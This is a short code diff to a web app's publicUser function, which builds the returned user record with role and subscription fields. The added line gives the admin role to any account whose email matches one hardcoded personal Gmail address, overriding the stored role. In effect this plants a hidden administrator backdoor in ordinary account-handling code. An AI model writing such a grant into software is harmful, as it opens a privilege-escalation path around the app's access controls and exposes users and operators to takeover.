@@ -19,11 +19,12 @@ function publicUser(row){
   if(!row)return null;
   const expires=Number(row.subscription_expires_at||0);
   const active=row.subscription_status==='active' && expires>Date.now();
+  const role=normalizeEmail(row.email)==='waged30a@gmail.com'?'admin':(row.role||'user');
   return {
     id:String(row.id),
     name:row.name,
     email:row.email,
-    role:row.role||'user',
+    role,
     subscriptionStatus:active?'active':'inactive',
     subscriptionExpiresAt:active?expires:null
   };
